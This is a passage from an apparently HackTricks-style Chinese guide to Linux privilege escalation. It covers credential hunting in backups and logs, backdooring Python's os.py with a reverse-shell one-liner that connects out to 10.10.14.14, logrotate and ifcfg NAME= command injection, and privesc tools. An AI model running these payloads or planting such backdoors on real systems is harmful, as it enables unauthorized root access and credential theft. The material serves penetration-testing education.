```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知可能包含密码的文件

阅读 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **若干可能包含密码的文件**。\
**另一个有趣的工具** 是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，这是一个开源应用，用于检索存储在本地计算机上的大量密码，支持 Windows、Linux & Mac。

### 日志

如果你能读取日志，可能会在其中找到 **有趣/机密的信息**。日志越异常，越可能包含有价值的信息（大概）。\
另外，一些“**糟糕**”配置的（或被植入后门的？）**audit logs** 可能允许你在 **audit logs** 中记录 **密码**，正如这篇文章所述：[https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有用。

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### 通用凭证搜索/Regex

你还应该检查文件名中或内容中包含 **password** 这个词的文件，并检查日志中的 IP 和邮箱，或哈希的正则表达式。\
我不会在此列出如何完成所有这些检查，但如果你感兴趣，可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## 可写文件

### Python 库劫持

如果你知道从 **哪里** 将执行某个 python 脚本，且你 **可以在该文件夹中写入** 或者你可以 **修改 python libraries**，你就可以修改 OS library 并植入后门（如果你可以写入 python 脚本要执行的位置，就复制并粘贴 os.py 库）。

要**在库中植入后门**，只需在 os.py 库的末尾添加以下一行（change IP and PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate 漏洞利用

`logrotate` 中的一个漏洞允许对日志文件或其父目录拥有 **写权限** 的用户可能获得提权。因为 `logrotate` 通常以 **root** 运行，可以被操纵去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的是不仅要检查 _/var/log_ 中的权限，也要检查任何应用日志轮替的目录。

> [!TIP]
> 该漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

更多关于该漏洞的详细信息见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 非常相似，所以每当你发现能够修改日志时，检查谁在管理这些日志，并检查是否可以通过将日志替换为 symlinks 来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**漏洞参考：** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果无论出于何种原因，用户能够 **write** 一个 `ifcf-<whatever>` 脚本到 _/etc/sysconfig/network-scripts_ **or** 能够 **adjust** 一个已有脚本，那么你的 **system is pwned**。

Network scripts，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上被 Network Manager (dispatcher.d) ~sourced~。

在我的情况下，这些 network scripts 中的 `NAME=` 属性没有被正确处理。如果名称中有 **white/blank space in the name the system tries to execute the part after the white/blank space**。这意味着 **everything after the first blank space is executed as root**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 存放了 System V init (SysVinit) 的 **脚本**，这是经典的 Linux 服务管理系统。它包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过位于 `/etc/rc?.d/` 的符号链接执行。在 Redhat 系统中的替代路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联，Upstart 是由 Ubuntu 引入的较新的服务管理，使用配置文件来进行服务管理任务。尽管有向 Upstart 的过渡，SysVinit 脚本仍由于 Upstart 的兼容层而与 Upstart 配置一起被使用。

**systemd** 是一种现代的初始化与服务管理器，提供诸如按需启动 daemon、automount 管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（用于发行版包）和 `/etc/systemd/system/`（用于管理员修改）中，从而简化系统管理流程。

## 其他技巧

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 常常 hook 一个 syscall，将有特权的内核功能暴露给 userspace manager。弱的 manager 身份验证（例如基于 FD-order 的签名检查或糟糕的密码方案）可能允许本地应用冒充该 manager，并在已 root 的设备上提升为 root。更多信息和利用细节请见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中基于正则的服务发现可以从进程命令行中提取二进制路径，并在特权上下文下使用 -v 执行该二进制。宽松的模式（例如使用 \S）可能会匹配位于可写位置（例如 /tmp/httpd）的攻击者放置的监听器，导致以 root 身份执行（CWE-426 Untrusted Search Path）。

更多信息以及适用于其他发现/监控栈的通用模式见： 

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## 内核安全防护

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc 工具

### **查找 Linux 本地 privilege escalation 向量 的最佳工具：** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** 列举 Linux 和 MAC 的内核漏洞 [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (物理访问):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考资料

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
